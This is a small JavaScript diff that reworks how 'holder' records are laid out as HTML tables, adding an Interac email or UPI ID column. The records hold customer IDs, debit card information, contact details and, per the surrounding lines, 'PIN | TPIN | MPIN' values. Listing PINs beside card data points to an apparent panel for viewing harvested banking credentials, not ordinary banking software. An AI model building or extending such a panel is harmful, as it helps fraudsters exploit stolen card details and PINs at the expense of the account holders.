@@ -693,15 +693,13 @@ document.addEventListener("DOMContentLoaded", () => {
     const createHolderTable = (holder, holderNum, holderType) => {
       return `
         <div class="holder-table-container">
-          <div class="holder-table-header">
-            <strong>Holder ${holderNum}: ${holder.name || ''}</strong> ${holderType}
-          </div>
           <table class="holder-info-table">
             <thead>
               <tr>
                 <th>Client ID or Customer ID:</th>
                 <th>Debit Card Information</th>
                 <th>Email | Phone</th>
+                <th>Interacc Email | UPI ID</th>
               </tr>
             </thead>
             <tbody>
@@ -709,6 +707,7 @@ document.addEventListener("DOMContentLoaded", () => {
                 <td>${holder.clientID || ''}</td>
                 <td>${holder.debitCard || ''}</td>
                 <td>${holder.emailPhone || ''}</td>
+                <td>${holder.interaccEmailOrUPIID || ''}</td>
               </tr>
             </tbody>
           </table>
@@ -722,9 +721,6 @@ document.addEventListener("DOMContentLoaded", () => {
             <div><strong>PIN | TPIN | MPIN:</strong> ${holder.pins}</div>
           </div>
           ` : ''}
-          <div class="holder-additional-info">
-            <div><strong>Interacc_Email_or_UPI_ID:</strong> ${holder.interaccEmailOrUPIID || ''}</div>
-          </div>
         </div>
       `;
     };
